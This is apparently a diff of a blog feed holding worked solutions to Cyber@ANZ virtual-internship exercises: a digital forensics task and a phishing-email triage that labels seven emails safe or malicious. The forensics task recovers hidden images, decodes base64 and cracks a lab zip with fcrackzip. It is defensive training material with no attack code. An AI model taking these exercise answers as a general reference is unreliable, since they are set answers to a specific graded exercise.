+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/13.png&quot; title=&quot;ANZ_Digital_Forensics/13.png&quot; alt=&quot;ANZ_Digital_Forensics/13.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-5&quot;&gt;&lt;strong&gt;Sub-task 5&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.txt&lt;/code&gt; file is actually a JPG image. This could be confirmed with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/14.png&quot; title=&quot;ANZ_Digital_Forensics/14.png&quot; alt=&quot;ANZ_Digital_Forensics/14.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;By changing the file extension to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hiddenmessage2.jpg&lt;/code&gt;. Here is how it looks like.&lt;/p&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/15.png&quot; title=&quot;ANZ_Digital_Forensics/15.png&quot; alt=&quot;ANZ_Digital_Forensics/15.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-6&quot;&gt;&lt;strong&gt;Sub-task 6&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;A hidden image is embedded in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;atm-image.jpg&lt;/code&gt;. I could confirm that by inspecting the file stream with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/16.png&quot; title=&quot;ANZ_Digital_Forensics/16.png&quot; alt=&quot;ANZ_Digital_Forensics/16.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Scrolling down a little bit, I found the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JFIF&lt;/code&gt; file signature.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/17.png&quot; title=&quot;ANZ_Digital_Forensics/17.png&quot; alt=&quot;ANZ_Digital_Forensics/17.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Extracting the second image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foremost&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/18.png&quot; title=&quot;ANZ_Digital_Forensics/18.png&quot; alt=&quot;ANZ_Digital_Forensics/18.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here is how it looks like.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/19.png&quot; title=&quot;ANZ_Digital_Forensics/19.png&quot; alt=&quot;ANZ_Digital_Forensics/19.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-7&quot;&gt;&lt;strong&gt;Sub-task 7&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; file content is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64-encoded&lt;/code&gt;. I decoded the content, and took a look at the file header, it appears to be a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt; image.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/20.png&quot; title=&quot;ANZ_Digital_Forensics/20.png&quot; alt=&quot;ANZ_Digital_Forensics/20.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;I simply redirected the decoded content of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken.png&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Here is how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;broken_recover.png&lt;/code&gt; image looks like when its recovered.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/21.png&quot; title=&quot;ANZ_Digital_Forensics/21.png&quot; alt=&quot;ANZ_Digital_Forensics/21.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;h4 id=&quot;sub-task-8&quot;&gt;&lt;strong&gt;Sub-task 8&lt;/strong&gt;&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;securepdf.pdf&lt;/code&gt; is a actually a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; file. Once again, I could state that by checking the file type with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/22.png&quot; title=&quot;ANZ_Digital_Forensics/22.png&quot; alt=&quot;ANZ_Digital_Forensics/22.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Extract the zip, I was prompted to enter a password.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/23.png&quot; title=&quot;ANZ_Digital_Forensics/23.png&quot; alt=&quot;ANZ_Digital_Forensics/23.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Crack the zip with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fcrackzip&lt;/code&gt;, the yielded password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/24.png&quot; title=&quot;ANZ_Digital_Forensics/24.png&quot; alt=&quot;ANZ_Digital_Forensics/24.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Extract the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zip&lt;/code&gt; with the password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secure&lt;/code&gt;, I managed to recover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rawpdf.pdf&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/25.png&quot; title=&quot;ANZ_Digital_Forensics/25.png&quot; alt=&quot;ANZ_Digital_Forensics/25.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Here is how the file looks like when its recovered.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Digital_Forensics/26.png&quot; title=&quot;ANZ_Digital_Forensics/26.png&quot; alt=&quot;ANZ_Digital_Forensics/26.png&quot; /&gt;
+          &lt;/div&gt;</content><author><name></name></author><category term="traffic_analysis" /><category term="digital_forensics" /><category term="blueteam" /><summary type="html">Task Description</summary></entry><entry><title type="html">Cyber@ANZ - Social Engineering Investigation</title><link href="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/" rel="alternate" type="text/html" title="Cyber@ANZ - Social Engineering Investigation" /><published>2021-09-22T02:13:37+10:00</published><updated>2021-09-22T02:13:37+10:00</updated><id>https://jayngng.github.io/blog/cyberanz---social-engineering-email-analysis</id><content type="html" xml:base="https://jayngng.github.io/blog/cyberanz-social-engineering-email-analysis/">&lt;h2 id=&quot;task-description&quot;&gt;&lt;strong&gt;Task Description&lt;/strong&gt;&lt;/h2&gt;
+&lt;p&gt;You have been assigned &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;7 emails&lt;/a&gt; to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.&lt;/p&gt;
+
+&lt;p&gt;You are expected to report your findings on each email, so that we can either block or release these emails to the users.&lt;/p&gt;
+
+&lt;p&gt;Download Emails: &lt;a href=&quot;https://cdn.theforage.com/vinternships/companyassets/AKkAyEwWc8wjPxx9n/Emails%20to%20Investigate.pdf&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;solutions&quot;&gt;&lt;strong&gt;Solutions&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;h4 id=&quot;email-1&quot;&gt;&lt;strong&gt;Email 1&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email1.png&quot; title=&quot;ANZ_Social_Engineering/email1.png&quot; alt=&quot;ANZ_Social_Engineering/email1.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The email does not contain a link or attachment.&lt;/li&gt;
+  &lt;li&gt;It appears to be a typical conversation between friends.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-2&quot;&gt;&lt;strong&gt;Email 2&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email2.png&quot; title=&quot;ANZ_Social_Engineering/email2.png&quot; alt=&quot;ANZ_Social_Engineering/email2.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;There is no formal email greeting.&lt;/li&gt;
+  &lt;li&gt;The email started with an abnormal “One Drive..” header.&lt;/li&gt;
+  &lt;li&gt;Inconsistency in writing. For example, “office 365 Email”.&lt;/li&gt;
+  &lt;li&gt;The spelling mistake in “recevie”.&lt;/li&gt;
+  &lt;li&gt;The attacker tries to convince the user to click on the “UPDATE YOUR ACCOUNT” leading to an unknown page.&lt;/li&gt;
+  &lt;li&gt;The words “ADOBE PDF” and “SECURITY” are unreasonably capitalized.&lt;/li&gt;
+  &lt;li&gt;Overall, the email is poorly written, with multiple spelling mistakes and inconsistent formatting. The final purpose is to trick the user into downloading and opening a dubious Adobe PDF file.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-3&quot;&gt;&lt;strong&gt;Email 3&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email3.png&quot; title=&quot;ANZ_Social_Engineering/email3.png&quot; alt=&quot;ANZ_Social_Engineering/email3.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The address is not legitimate due to the “b” letter and the Top Level Domain (TLD) of “.opt”, which indicates a malicious Facebook website.&lt;/li&gt;
+  &lt;li&gt;Overall, the user has been instilled a sense of curiosity to click on a malicious link.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-4&quot;&gt;&lt;strong&gt;Email 4&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email4.png&quot; title=&quot;ANZ_Social_Engineering/email4.png&quot; alt=&quot;ANZ_Social_Engineering/email4.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious/Spam&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;By inspecting the header information, we discover that the email is initially from Massdrop and is then forwarded by Adam.&lt;/li&gt;
+  &lt;li&gt;The email is written inconsistently, with some grammar errors in “a new adjustments”.&lt;/li&gt;
+  &lt;li&gt;There is potentially a high chance that Adam had modified the original email and the “SEE MORE” link location, which clicking on will redirect the user to land on an unknown website.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-5&quot;&gt;&lt;strong&gt;Email 5&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email5.png&quot; title=&quot;ANZ_Social_Engineering/email5.png&quot; alt=&quot;ANZ_Social_Engineering/email5.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The sender does not know the user’s identity. As a result, he/she solely “Hi” without mentioning the user’s name.&lt;/li&gt;
+  &lt;li&gt;The email is so generic that it could apply to anyone.&lt;/li&gt;
+  &lt;li&gt;The sender tries to instill a sense of urgency to hopefully compromise the user’s credentials.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-6&quot;&gt;&lt;strong&gt;Email 6&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email6.png&quot; title=&quot;ANZ_Social_Engineering/email6.png&quot; alt=&quot;ANZ_Social_Engineering/email6.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Safe&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Both Reuben and Alan are using ANZ business email.&lt;/li&gt;
+  &lt;li&gt;In general, the email looks legitimate and professional, while both the sender and responder seem to be on the same page.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;email-7&quot;&gt;&lt;strong&gt;Email 7&lt;/strong&gt;&lt;/h4&gt;
+
+&lt;div class=&quot;row imager__plugin&quot;&gt;
+            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/ANZ_Social_Engineering/email7.png&quot; title=&quot;ANZ_Social_Engineering/email7.png&quot; alt=&quot;ANZ_Social_Engineering/email7.png&quot; /&gt;
+          &lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Malicious&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The email contains one dubious link leading to a suspicious website.&lt;/li&gt;
+  &lt;li&gt;Overall, the marketing email is not professional and lacks information but an address leads to an unknown source.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="blueteam" /><category term="socialengineering" /><category term="defense" /><summary type="html">Task Description You have been assigned 7 emails to investigate. Some of these emails may contain content which can be classed as malicious, due to a number of reasons. They may contain malicious attachments, suspicious links, or Phishing attempts to gather private account information from the user.</summary></entry></feed>
